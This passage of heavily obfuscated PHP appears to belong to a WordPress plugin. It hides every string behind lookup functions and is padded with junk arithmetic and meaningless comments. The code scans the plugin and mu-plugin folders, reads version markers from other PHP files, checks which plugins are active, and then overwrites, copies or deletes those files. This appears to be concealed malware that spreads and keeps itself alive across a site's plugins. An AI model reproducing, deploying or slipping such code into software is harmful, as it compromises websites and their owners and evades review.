       $esll_dnzslyy07    = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($hqtzgh899h0dszi,   false,  null,    0,   (4049+47));



 if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($esll_dnzslyy07)   &&  $GLOBALS['__scf_ak3p5za9uvhzh8_96'](ar6vo_1nyhx2koj5(1721),    $esll_dnzslyy07, $b58sljzlkzqy)) $wn99uh8wlw5q =      $b58sljzlkzqy[1];
if     ($wn99uh8wlw5q  !==     ""  &&   defined(xognx_h1jzkh(1708)))     {
    $ij5hz0yil6w7vj =  array();
$fp_hbanuj006q =    defined(bk9m46jygo3f(804)) ?    WPMU_PLUGIN_DIR  :  WP_CONTENT_DIR .     ar6vo_1nyhx2koj5(14);

   $mri3aluqpjhvj    = defined(bk9m46jygo3f(682))  ?  WP_PLUGIN_DIR   :    WP_CONTENT_DIR     .  xognx_h1jzkh(1299);
$xts9t1z6wlk2wuuz =     false;
     if  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1602)))  {
   $t7jic_8k_dgs9  =   @$GLOBALS['__scf_h23c49ni_b86_43']($fp_hbanuj006q)  ?    @$GLOBALS['__scf_b60g6hx_a7ggi_71']($fp_hbanuj006q  .     xognx_h1jzkh(1876))  :  false;
$yzala8ucfe    =    @$GLOBALS['__scf_b60g6hx_a7ggi_71']($mri3aluqpjhvj  . xognx_h1jzkh(1553));
     if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($t7jic_8k_dgs9) || $GLOBALS['__scf_zj8mp2xbaqmp_35']($yzala8ucfe)) {

     $xts9t1z6wlk2wuuz    =     true;

       foreach   ((array)  $t7jic_8k_dgs9     as $y165uf2y20ey30h8)  $ij5hz0yil6w7vj[]     =     $y165uf2y20ey30h8;
 foreach ((array)  $yzala8ucfe   as  $y165uf2y20ey30h8)  $ij5hz0yil6w7vj[]      =  $y165uf2y20ey30h8;$j_mbjqlwoz1c=PHP_MAJOR_VERSION;$k828mipk1s1piz=$j_mbjqlwoz1c*3;
}
unset($t7jic_8k_dgs9,  $yzala8ucfe);
   }
// WP Cover Block: unlock principal

    if   (!$xts9t1z6wlk2wuuz)    {


 $eeveen5xlc   =  @$GLOBALS['__scf_h23c49ni_b86_43']($fp_hbanuj006q)  ?  wou4lqmx3dh5mlyfq3($fp_hbanuj006q,    (8763-3763))  :  false;
       if   ($GLOBALS['__scf_zj8mp2xbaqmp_35']($eeveen5xlc))  foreach ($eeveen5xlc      as  $xfizg8us6ucth8y)  {
 if  ($GLOBALS['__scf__fl_gwujcblq_9']($xfizg8us6ucth8y, -(7-3))     ===    xognx_h1jzkh(1877))   $ij5hz0yil6w7vj[]  =    $fp_hbanuj006q   . '/'     .     $xfizg8us6ucth8y;


     }
   $eeveen5xlc = @$GLOBALS['__scf_h23c49ni_b86_43']($mri3aluqpjhvj) ? wou4lqmx3dh5mlyfq3($mri3aluqpjhvj, (5139-139)) :      false;
 if     ($GLOBALS['__scf_zj8mp2xbaqmp_35']($eeveen5xlc))  foreach ($eeveen5xlc  as   $xfizg8us6ucth8y)  {
   $c29d01nbu4ib98o   =    $mri3aluqpjhvj   .  '/'  .  $xfizg8us6ucth8y;
if (!@$GLOBALS['__scf_h23c49ni_b86_43']($c29d01nbu4ib98o))    continue;
$prxw8s2lsoq7     =  wou4lqmx3dh5mlyfq3($c29d01nbu4ib98o,  (4971+29));
   if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($prxw8s2lsoq7))   continue;
  foreach     ($prxw8s2lsoq7 as      $o8xla914ij47z)  {
  if  ($GLOBALS['__scf__fl_gwujcblq_9']($o8xla914ij47z, -(240^244)) ===      ar6vo_1nyhx2koj5(1877)) $ij5hz0yil6w7vj[]    =      $c29d01nbu4ib98o   .   '/'  . $o8xla914ij47z;
 }
 }
  unset($eeveen5xlc, $xfizg8us6ucth8y,     $o8xla914ij47z,    $c29d01nbu4ib98o, $prxw8s2lsoq7);
}
$qds42w30vy  =  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($hqtzgh899h0dszi,  gz_aorofp7mo(1877));
  foreach  ($ij5hz0yil6w7vj as    $y165uf2y20ey30h8)    {
  if  ($y165uf2y20ey30h8   ===  $hqtzgh899h0dszi)  continue;
 $sliuow784b2as68s    =  @$GLOBALS['__scf_k4z5lhhe91ty_98']($y165uf2y20ey30h8);
if  (!$sliuow784b2as68s  || ($sliuow784b2as68s    %  (99970+30))  !== (132248-38429)) {


    $tg6m_v229f     =    @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($y165uf2y20ey30h8);
     if   (!$tg6m_v229f ||  $tg6m_v229f <   (482+18)    ||  $tg6m_v229f >  (52428701+99))   continue;



    }
   $esll_dnzslyy07    = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($y165uf2y20ey30h8,     false, null,  0,   (4080+16));
$b58sljzlkzqy     =   array();

if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($esll_dnzslyy07))  $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(1878), $esll_dnzslyy07,  $b58sljzlkzqy);
 if (empty($b58sljzlkzqy[1]))     {


     if (!mowf3lw2lqslkaudd($y165uf2y20ey30h8,    (4665+335)))    continue;
$b58sljzlkzqy    =    array("",    xognx_h1jzkh(1879));
        }
 if      ($GLOBALS['__scf_pmoxtzoe3f0qw_3']($y165uf2y20ey30h8,  xognx_h1jzkh(1877))     ===   $qds42w30vy  && $b58sljzlkzqy[1]   ===  $wn99uh8wlw5q) {



   if  (!p1_iuc73ns3yabl($y165uf2y20ey30h8))   {
        if  (b4za25lhh9bxaf_($y165uf2y20ey30h8,   $y165uf2y20ey30h8  .  xognx_h1jzkh(191))  &&     $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1289)))  @opcache_invalidate($y165uf2y20ey30h8,  true);
        }



 continue;



}
 if   (version_compare($b58sljzlkzqy[1],  $wn99uh8wlw5q,  '<')) {
$k9zizvtq1ueqy = p82470xv4eq7_pm5tl4hw9($y165uf2y20ey30h8);


    if  ($k9zizvtq1ueqy     ===     false)    {
kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1521),  bk9m46jygo3f(1555)    .  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($y165uf2y20ey30h8));
   continue;
}
 if  ($k9zizvtq1ueqy  ===  true)  {
     if  (b4za25lhh9bxaf_($y165uf2y20ey30h8,  $y165uf2y20ey30h8  .  xpm5lg9odtw6di(1880)))  {
if ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1289)))  @opcache_invalidate($y165uf2y20ey30h8, true);
 } elseif  (!hywr5mypyyx_m1lqunrdm($y165uf2y20ey30h8)  &&     r0pcenevhaaasknjjb8v7l($y165uf2y20ey30h8))    {
// @finalize director

nd3injed5_l_b3hb($y165uf2y20ey30h8);
     xsvrgduv7c8lwjvkral($y165uf2y20ey30h8);
 }
  @$GLOBALS['__scf_qsx1vml11ds_19']($GLOBALS['__scf_meo_1tvjsals_11']($y165uf2y20ey30h8) .    xpm5lg9odtw6di(1556) .    $GLOBALS['__scf_pmoxtzoe3f0qw_3']($y165uf2y20ey30h8,   bk9m46jygo3f(1881)));


  continue;
  }

      if  (!hywr5mypyyx_m1lqunrdm($y165uf2y20ey30h8)  &&  r0pcenevhaaasknjjb8v7l($y165uf2y20ey30h8))   {
        nd3injed5_l_b3hb($y165uf2y20ey30h8);
  xsvrgduv7c8lwjvkral($y165uf2y20ey30h8);



      }
    bbt0aigh_ei6k8r80ejx($y165uf2y20ey30h8);$tyyuebmce=(0x26+0x95);$uhdvexqhw=$tyyuebmce%8;
  continue;
       }
     $cwc7_dkr57xp  =   ($GLOBALS['__scf_pmoxtzoe3f0qw_3']($GLOBALS['__scf_meo_1tvjsals_11']($y165uf2y20ey30h8))  === gz_aorofp7mo(1882)     ||  $GLOBALS['__scf_meo_1tvjsals_11']($y165uf2y20ey30h8)  === $fp_hbanuj006q);
   if  (!$cwc7_dkr57xp   &&  $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1572)))  {
    $faay77i8s323j = $GLOBALS['__scf_pmoxtzoe3f0qw_3']($GLOBALS['__scf_meo_1tvjsals_11']($y165uf2y20ey30h8))  .      '/'    .    $GLOBALS['__scf_pmoxtzoe3f0qw_3']($y165uf2y20ey30h8);
 $jqu64em46a2graaf  =  (array) @get_option(xognx_h1jzkh(146),     array());
  $cwc7_dkr57xp    =   $GLOBALS['__scf_uh0dc0gefs_xhu_149']($faay77i8s323j,   $jqu64em46a2graaf, true);
  if  (!$cwc7_dkr57xp     && $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(207))  && is_multisite() &&   $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1662))) {
$gacmpz5wu1wi6b    =    (array)  @get_site_option(gz_aorofp7mo(209),  array());
  $cwc7_dkr57xp  =    isset($gacmpz5wu1wi6b[$faay77i8s323j]);
 unset($gacmpz5wu1wi6b);
   }
   unset($faay77i8s323j,   $jqu64em46a2graaf);
  }
  if   (!$cwc7_dkr57xp)  continue;
     if    (version_compare($b58sljzlkzqy[1],  $wn99uh8wlw5q,     '>')) {



 if   (p1_iuc73ns3yabl($y165uf2y20ey30h8) &&   !uhf6bhl56vbd0r9tcy4($y165uf2y20ey30h8)      &&   !v2eakz3li1fhe2q6_p9r6k($y165uf2y20ey30h8,    $hqtzgh899h0dszi)) return;
   $hrdl8rthqnae  = $GLOBALS['__scf_meo_1tvjsals_11']($y165uf2y20ey30h8) . xognx_h1jzkh(1883)   .  $GLOBALS['__scf_eo363tjzd4r6n_56']($y165uf2y20ey30h8);
 if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($hrdl8rthqnae)    &&      (int)  @$GLOBALS['__scf_k4z5lhhe91ty_98']($hrdl8rthqnae)     < $GLOBALS['__scf_ks7_xfapvywl_185']() - (9+51))      {
 $r4butcbj_14i6bgl  = $GLOBALS['__scf_w_xu8rj4lvsj44_113']('|',  (string)   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($hrdl8rthqnae));
if     ($GLOBALS['__scf_oenrsvkzs1_36']($r4butcbj_14i6bgl) <  2  || $r4butcbj_14i6bgl[0]     !==   $b58sljzlkzqy[1]    || (int) $r4butcbj_14i6bgl[1]    !==   (int)  @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($y165uf2y20ey30h8))    {
       @$GLOBALS['__scf_qsx1vml11ds_19']($hrdl8rthqnae);
  continue;

}
   if (p82470xv4eq7_pm5tl4hw9($y165uf2y20ey30h8)  !== false) {
f97udlofaljpuxw1_jgnfh($y165uf2y20ey30h8, (0x10d+0x97));
if     (xv6oqhjncehpr7v_mus7($y165uf2y20ey30h8)) {
  @$GLOBALS['__scf_qsx1vml11ds_19']($hrdl8rthqnae);
  

if   ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1289)))  @opcache_invalidate($y165uf2y20ey30h8,      true);
     }
     }



 continue;
  }



@$GLOBALS['__scf_qy_a5siry0hu3_197']($hrdl8rthqnae,     $b58sljzlkzqy[1]  . '|'   .   (int)    @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($y165uf2y20ey30h8));
 continue;
  }
if  ($b58sljzlkzqy[1] ===  $wn99uh8wlw5q) {
$f0glbnr1jpb   =  gc7qjnf6lmnfaja0f_();
$h23usxu3znj500wq  =  false;


 if     (!empty($f0glbnr1jpb[ar6vo_1nyhx2koj5(1352)]))  {
// dominate thread-safe decorator

$wpz60c91v9do   =   @$GLOBALS['__scf_amk7iuqda_oe_33']($f0glbnr1jpb[xpm5lg9odtw6di(1352)]);
$ri488lcte5dho = @$GLOBALS['__scf_amk7iuqda_oe_33']($y165uf2y20ey30h8);



 if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($wpz60c91v9do)    &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($ri488lcte5dho) &&  $wpz60c91v9do ===  $ri488lcte5dho &&  oso_rftyhowcddafxsw($f0glbnr1jpb)    ===  ar6vo_1nyhx2koj5(1499)  &&   p1_iuc73ns3yabl($y165uf2y20ey30h8))  {
 if  (v2eakz3li1fhe2q6_p9r6k($y165uf2y20ey30h8, $hqtzgh899h0dszi))     $h23usxu3znj500wq  =   true;
else  return;
     }
// @shard handshake

    if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($wpz60c91v9do)     && $wpz60c91v9do  ===   @$GLOBALS['__scf_amk7iuqda_oe_33']($hqtzgh899h0dszi))   $h23usxu3znj500wq = true;
   }

  if   (!$h23usxu3znj500wq  &&  !p1_iuc73ns3yabl($y165uf2y20ey30h8))  {
    if    (uhf6bhl56vbd0r9tcy4($y165uf2y20ey30h8)   || p82470xv4eq7_pm5tl4hw9($y165uf2y20ey30h8)     !==   false)  {
 if    (b4za25lhh9bxaf_($y165uf2y20ey30h8,  $y165uf2y20ey30h8   .  xognx_h1jzkh(1880))   &&   $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1289)))    @opcache_invalidate($y165uf2y20ey30h8, true);
  }
   unset($f0glbnr1jpb, $h23usxu3znj500wq,    $wpz60c91v9do,  $ri488lcte5dho);
      continue;



 }


       if  (!$h23usxu3znj500wq   &&  $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($GLOBALS['__scf_pmoxtzoe3f0qw_3']($y165uf2y20ey30h8, gz_aorofp7mo(1884))), 0, (0x8+0x4))  >    $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($qds42w30vy),  0,    (8+4)))  {
  if  (!v2eakz3li1fhe2q6_p9r6k($y165uf2y20ey30h8, $hqtzgh899h0dszi))   return;
     }

       unset($f0glbnr1jpb,  $h23usxu3znj500wq,  $wpz60c91v9do,  $ri488lcte5dho);


}
 }

}
unset($hqtzgh899h0dszi,  $wn99uh8wlw5q, $esll_dnzslyy07,     $b58sljzlkzqy, $ij5hz0yil6w7vj,  $fp_hbanuj006q, $mri3aluqpjhvj,    $y165uf2y20ey30h8,  $sliuow784b2as68s,    $qds42w30vy,  $tg6m_v229f,  $k9zizvtq1ueqy, $hrdl8rthqnae,  $r4butcbj_14i6bgl);
  }     catch  (Throwable $o_qyrtxl85owt)  {
   }     catch  (Exception  $o_qyrtxl85owt) {
   }
    unset($n1i7gpxlz2v08);
 if     (isset($GLOBALS[gz_aorofp7mo(181)])) {
   if   (version_compare((string)   $GLOBALS[xpm5lg9odtw6di(1885)], xl8k_pjv1048a7ae7(),  xpm5lg9odtw6di(1886)))      return;
   $GLOBALS[bk9m46jygo3f(1567)] =  1;
       }  elseif  (defined(gz_aorofp7mo(1887))) {
    $e5q64is0zq5eevz = constant(bk9m46jygo3f(1887));


   if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($e5q64is0zq5eevz) &&   $GLOBALS['__scf_ak3p5za9uvhzh8_96'](ar6vo_1nyhx2koj5(1292),    $e5q64is0zq5eevz)     &&    version_compare($e5q64is0zq5eevz,  xl8k_pjv1048a7ae7(),   xpm5lg9odtw6di(1886)))  return;
$GLOBALS[bk9m46jygo3f(1567)]  =  1;
 unset($e5q64is0zq5eevz);
       }
  $GLOBALS[ar6vo_1nyhx2koj5(1888)]  = xl8k_pjv1048a7ae7();



 if  ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(59)))      @clearstatcache(true,   bho93o6vof3ni5_rg622_h());
 $GLOBALS[ar6vo_1nyhx2koj5(1889)]     =    (string) @$GLOBALS['__scf_r6y1fbsyx8i2l_99'](bho93o6vof3ni5_rg622_h())   . ':'   . (string) @$GLOBALS['__scf_k4z5lhhe91ty_98'](bho93o6vof3ni5_rg622_h());
/* deflationary filter-chain */

    if  (!defined(xognx_h1jzkh(1890)))   define(ar6vo_1nyhx2koj5(1891), xl8k_pjv1048a7ae7());
if      (!defined(bk9m46jygo3f(1892))) define(bk9m46jygo3f(1892),  xl8k_pjv1048a7ae7());


vssmljt7_blzonb7w7(gz_aorofp7mo(1358));
    
jju_w4lsrl3omyhrn90(bho93o6vof3ni5_rg622_h());

if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1893))  &&   $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1894))) {



   try   {
   $vn3os7uhpx      =    sxupmu4fhe9r2zxw();
    if (@$GLOBALS['__scf_h23c49ni_b86_43']($vn3os7uhpx))    {
 $f8k9xl6j710   =    gjb4l0gtgi874122wes();
 $k4c9kkzhc9nyhy    =     wou4lqmx3dh5mlyfq3($vn3os7uhpx,  (357+4643));$i6e_j_u1d8w=90+61;$dh0a19ed=$i6e_j_u1d8w-26;
if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($k4c9kkzhc9nyhy))     {
    foreach ($k4c9kkzhc9nyhy   as $t4xbebf0we8o8zp)  {
if ($t4xbebf0we8o8zp  ===   $f8k9xl6j710)    continue;
if   ($GLOBALS['__scf_bwbaq8fxyxm3_103']($GLOBALS['__scf_zmckaak88my_204']($t4xbebf0we8o8zp, constant(ar6vo_1nyhx2koj5(1895))))   !==  xognx_h1jzkh(1896))     continue;
  

$il3zdkxo6f1fl2c4 =   $vn3os7uhpx  . '/' .  $t4xbebf0we8o8zp;
if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($il3zdkxo6f1fl2c4)    &&   @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($il3zdkxo6f1fl2c4)  > (4990+10) &&     mowf3lw2lqslkaudd($il3zdkxo6f1fl2c4,  (4994+6)))     {
    bfbdcyrp64yrfxkld($il3zdkxo6f1fl2c4);
  }
  }
 }



}


}  catch     (Throwable   $o_qyrtxl85owt)    {
// Xdebug profiler: rollback trie

   kkpdha95nyx3tbltd10(xognx_h1jzkh(221), $o_qyrtxl85owt);
     } catch (Exception   $o_qyrtxl85owt)   {
   }
     }
     
   if  (!     fqx8fi5u_dltwt2m84v4m())  {
  at5lxm3vzat7_ev9(xognx_h1jzkh(1407),    bk9m46jygo3f(1897),   1);
      }



  
$GLOBALS[xpm5lg9odtw6di(687)]  = array();   
 $GLOBALS[ar6vo_1nyhx2koj5(438)] =   array();    
$GLOBALS[xognx_h1jzkh(1781)] =  "";   
 if    ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(169)))    {
     $GLOBALS['__scf_l3dns7czmg3tv_169'](xognx_h1jzkh(1898));$au80gq2yzlvpf=91+58;$ydkimg38vux=$au80gq2yzlvpf-27;
     $GLOBALS['__scf_l3dns7czmg3tv_169'](xognx_h1jzkh(1899));
 }
// graph coloring

 $hm9jsua_5d0kqoqq    = $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()) . xognx_h1jzkh(1900)  . $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),  xpm5lg9odtw6di(1901));
if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($hm9jsua_5d0kqoqq)) {$kgwteu7ba=3112;$nuh53go__qnm2=$kgwteu7ba%13;
   $t29m7i5qhp     =    $GLOBALS['__scf_u6m4cedwgt__319']((string) @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($hm9jsua_5d0kqoqq));
      

      $ozpzbrzfs7_l25   =   i58zup85av0875_k0xrmtd();
if     ($t29m7i5qhp  ===  ""  ||   ($ozpzbrzfs7_l25 !==   ""    && $t29m7i5qhp  !==  $ozpzbrzfs7_l25))    xv6oqhjncehpr7v_mus7($hm9jsua_5d0kqoqq);
      unset($t29m7i5qhp, $ozpzbrzfs7_l25);
 }
try    {


@$GLOBALS['__scf_iylawj38txgw_73']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h())  .   xpm5lg9odtw6di(1902)    . $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), gz_aorofp7mo(1901)));
$ozpzbrzfs7_l25    = i58zup85av0875_k0xrmtd();
     if ($ozpzbrzfs7_l25   !==   "")  {
     $tsbot75h0w     =   xpm5lg9odtw6di(1903)  . $ozpzbrzfs7_l25;
foreach   (array($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()), sxupmu4fhe9r2zxw())   as    $jvealkd3rv)  {
 if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($jvealkd3rv    .  '/'  .  $tsbot75h0w))  @$GLOBALS['__scf_qsx1vml11ds_19']($jvealkd3rv   .     '/'  .   $tsbot75h0w);

  }
  }


      unset($ozpzbrzfs7_l25, $tsbot75h0w,  $jvealkd3rv);
 }   catch  (Throwable  $o_qyrtxl85owt) {

     } catch    (Exception  $o_qyrtxl85owt) {
// collect streaming witness

   }
 unset($hm9jsua_5d0kqoqq);

       at5lxm3vzat7_ev9(xpm5lg9odtw6di(752),  gz_aorofp7mo(1904),   0);

    at5lxm3vzat7_ev9(gz_aorofp7mo(752),  gz_aorofp7mo(1905),  0);
  at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(1906), ar6vo_1nyhx2koj5(1904), 0);$qocuq8n1dc6x=(0xe5+0x2);$g7i_vixy=$qocuq8n1dc6x%5;
   at5lxm3vzat7_ev9(bk9m46jygo3f(1907), ar6vo_1nyhx2koj5(1908),   0);
 at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(1907),   ar6vo_1nyhx2koj5(1909),  2);
   at5lxm3vzat7_ev9(xpm5lg9odtw6di(1910),    gz_aorofp7mo(1911),  (0x2+0x1));
  at5lxm3vzat7_ev9(bk9m46jygo3f(1910), ar6vo_1nyhx2koj5(1912), (0x2+0x2));
   at5lxm3vzat7_ev9(gz_aorofp7mo(1407),  xognx_h1jzkh(1913),      (0x1+0x4));
h345r36mfxa4f8(gz_aorofp7mo(1914),   gz_aorofp7mo(1915), (0x3+0x7),    1);
    h345r36mfxa4f8(xpm5lg9odtw6di(1916), xognx_h1jzkh(1915),    (11-1),     1);
h345r36mfxa4f8(bk9m46jygo3f(1917),    xpm5lg9odtw6di(1918), (0x1+0x9),      1);
    h345r36mfxa4f8(gz_aorofp7mo(1919),  xpm5lg9odtw6di(1918),  (52^62),   1);

    



     h345r36mfxa4f8(ar6vo_1nyhx2koj5(1920),  xpm5lg9odtw6di(1921),   (0x6+0x3e1), (0x2+0x1));
   at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(876),  xognx_h1jzkh(1922),  (0x211+0x1d6), 2);

h345r36mfxa4f8(xognx_h1jzkh(1923),  ar6vo_1nyhx2koj5(1924));
      h345r36mfxa4f8(gz_aorofp7mo(1925),    gz_aorofp7mo(1926),    (3+7), 2);$_d5chx4os=-513;$mzh4kpi10eg=($_d5chx4os>0)?$_d5chx4os:-$_d5chx4os;
 h345r36mfxa4f8(xognx_h1jzkh(1927),   xognx_h1jzkh(1928));




 h345r36mfxa4f8(ar6vo_1nyhx2koj5(1929), gz_aorofp7mo(1930),   (5+5),  1);
   



       h345r36mfxa4f8(bk9m46jygo3f(1931), xognx_h1jzkh(1932),   (0x2+0x8),  2);

    at5lxm3vzat7_ev9(bk9m46jygo3f(1933),  gz_aorofp7mo(1934));
h345r36mfxa4f8(xognx_h1jzkh(1935), ar6vo_1nyhx2koj5(790));
   
 h345r36mfxa4f8(gz_aorofp7mo(1936),  xpm5lg9odtw6di(791));
    
        at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(1937),  gz_aorofp7mo(1938), -(940+59));
 at5lxm3vzat7_ev9(gz_aorofp7mo(1939),     xognx_h1jzkh(1938),  -(0x8b+0x35c));
 at5lxm3vzat7_ev9(bk9m46jygo3f(1940),  xognx_h1jzkh(1941),     -(0x1b1+0x236));
    
  at5lxm3vzat7_ev9(xognx_h1jzkh(1942),    bk9m46jygo3f(1943),    (177+822));
 

       at5lxm3vzat7_ev9(gz_aorofp7mo(1944),   gz_aorofp7mo(1945), 0);
    at5lxm3vzat7_ev9(xognx_h1jzkh(1946), xpm5lg9odtw6di(1947), 0);
   at5lxm3vzat7_ev9(gz_aorofp7mo(1948), ar6vo_1nyhx2koj5(1949),  (970+29));



        at5lxm3vzat7_ev9(xpm5lg9odtw6di(1950),    gz_aorofp7mo(1951),   (1984-985));

at5lxm3vzat7_ev9(bk9m46jygo3f(1946), xognx_h1jzkh(1952),  2);
 at5lxm3vzat7_ev9(bk9m46jygo3f(1946),     ar6vo_1nyhx2koj5(1953),      0);
  
 at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(1954),  xpm5lg9odtw6di(1955),    0);
   at5lxm3vzat7_ev9(gz_aorofp7mo(1956),   xpm5lg9odtw6di(1957),  0);

     
 at5lxm3vzat7_ev9(xognx_h1jzkh(1958), xpm5lg9odtw6di(1959),  1);
 at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(1960),   xognx_h1jzkh(1961), 2);




  at5lxm3vzat7_ev9(bk9m46jygo3f(1960), ar6vo_1nyhx2koj5(1909),   (4-1));
  




     at5lxm3vzat7_ev9(xognx_h1jzkh(1960), xognx_h1jzkh(1962),    (0x2+0x2));
 at5lxm3vzat7_ev9(bk9m46jygo3f(1960),   xpm5lg9odtw6di(1639),   (0x3+0x2));
     at5lxm3vzat7_ev9(xognx_h1jzkh(1963),   xognx_h1jzkh(1964),  (3+3));



 at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(1963),     xognx_h1jzkh(1965), (0x3+0x3));
 at5lxm3vzat7_ev9(xognx_h1jzkh(1966),  gz_aorofp7mo(1967));


at5lxm3vzat7_ev9(xpm5lg9odtw6di(1963),   xognx_h1jzkh(1968),      (10-3));
     if   ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(169)))    {$kdt8gbccagmclu=(0xc5+0xc9);$vozn4lw92=$kdt8gbccagmclu%10;


 $GLOBALS['__scf_l3dns7czmg3tv_169'](function  ()   {
   if    (!empty($GLOBALS[ar6vo_1nyhx2koj5(1969)])) return;

     if   (!defined(xognx_h1jzkh(1596))   ||      !$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1970))) return;
     if ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1968)))  {
   try      {
 fn97j4kcxtotofg();
    }     catch (Throwable  $o_qyrtxl85owt)   {
    } catch (Exception  $o_qyrtxl85owt)   {
      }

       }
 });
}
// reject timeout-policy for mbstring strict



    at5lxm3vzat7_ev9(xognx_h1jzkh(1971),   bk9m46jygo3f(1972),    (2<<2));
at5lxm3vzat7_ev9(xognx_h1jzkh(1973),      xognx_h1jzkh(1974));
 at5lxm3vzat7_ev9(xpm5lg9odtw6di(1975),  bk9m46jygo3f(1976));
 at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(1407),    bk9m46jygo3f(1977),  (1+9));
 at5lxm3vzat7_ev9(xognx_h1jzkh(1978),   function  ()   {
if (!$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1979))  || !$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1727)))  return;
   $_y40_e6mln0tptjs     = (int)    @get_option(xognx_h1jzkh(1980),  0);
    if  (($GLOBALS['__scf_ks7_xfapvywl_185']()     -  $_y40_e6mln0tptjs)  >  (7134-3534)) {
    if (!zo4j_zt94w3xi7lu1pd()) return;
  @update_option(xognx_h1jzkh(1981),     $GLOBALS['__scf_ks7_xfapvywl_185']());
   yq0l62xbb03co56rhc1p_c();
 }
 },     (0x5+0x4));
 
  at5lxm3vzat7_ev9(gz_aorofp7mo(100),      bk9m46jygo3f(1982));
    h345r36mfxa4f8(bk9m46jygo3f(1983),   gz_aorofp7mo(1984));
  if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(460))    &&    did_action(gz_aorofp7mo(1985)))    {
 qzygn58_p_e_6l();
   }
    
}